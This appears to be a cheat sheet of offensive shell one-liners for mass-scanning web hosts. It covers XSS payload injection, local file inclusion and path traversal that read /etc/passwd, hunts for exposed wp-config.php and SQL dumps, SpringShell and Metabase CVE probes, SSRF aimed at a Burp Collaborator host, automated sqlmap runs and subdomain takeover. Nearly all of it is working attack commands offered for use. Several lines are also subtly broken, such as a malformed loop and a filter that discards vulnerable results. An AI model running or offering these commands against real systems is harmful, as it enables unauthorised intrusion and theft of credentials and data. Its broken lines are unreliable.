# Oneliners

### XSS from waybackurls and qsreplace
`echo https://target.com
 | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq`

### Local File Inclusion using httpx
`cat hosts | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -mr "root:x" | anew lfi-httpx.txt`

### Wordpress Wp-content mysql.sql
`cat hosts.txt | httpx -c -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -p 80,443,8080,8443 | anew wp-sql.txt`

### CVE-2022-22963 SpringShell (400 Code --> Vulnerability)
`for host in hosts.txt; do curl $host:port/path?class.module.classLoader.URLs%5B0%5D=0; done`

### SSRF using dnsx, httpx, gau and qsreplace
`cat subdomains.txt | dnsx | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://hacker.burpcollaborator.net`

### SQLi using dnsx, httpx, xargs, findomain, waybackurls, gf, sqlmap
`httpx -l targets.txt -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'`

### Local File Inclusion using Gau, gf, xargs
`cat sudomains.txt | httpx -silent -threads 500 | gau | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%"  2>&1 | grep -q "  root:x" && echo " VULN! %"'`

### CVE-2021-41277 Local File Inclusion in Metabase
cat live.txt | while read host do;do curl --silent --insecure --path-as-is "$host/api/geojson?url=file:///etc/passwd" | grep -qs "root:x" && echo "$host Vulnerable";done

### XSS using airixss, waybackurls, gf, uro, httpx, qsreplace
echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"

### Company Sensitive Data using gau
`cat subdomains.txt | gau | tee gau.txt | grep -E
"\\.xls|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.mp3|\\.mp4|\\.zip|\\.tar|\\.gzip|\\.rar|\\.json"
| tee sensitive-files.txt`


### Generate Target Based Wordlist with gau and unfurl
`cat subdomains.txt | gau | unfurl paths | rev | cut -d '/' -f1 | rev | sort -u | tee wordlist.txt`

### /api/geojson target IP ranges LFI
`cat subdomains.txt | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "/api/geojson?url=file:///etc/passwd" -mr "root:x" | anew geojson-lfi.txt`

### Nginx Path Traversal
`cat subdomains.txt | httpx -silent -path "///////../../../../../../etc/passwd" -sc -mc 200 -mr 'root:x' | anew nginx-traversal.txt`

### wp-config.php_orig using httpx
`cat subdomains.txt | httpx -silent -sc -mc 200 -path "/wp-config.php_org" -mr "DB_PASSWORD" | anew wp-config.php_orig`

### Create your own wordlist from @0xJin
`cat domains.txt | httpx | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a wordlist.txt`

### Subdomain Takeover
`cat domains.txt | assetfinder --subs-only | tee subdomains.txt; subjack -w
subdomains.txt -ssl -t 100 | tee -a takeover.txt | grep -v "Vulnerable"`
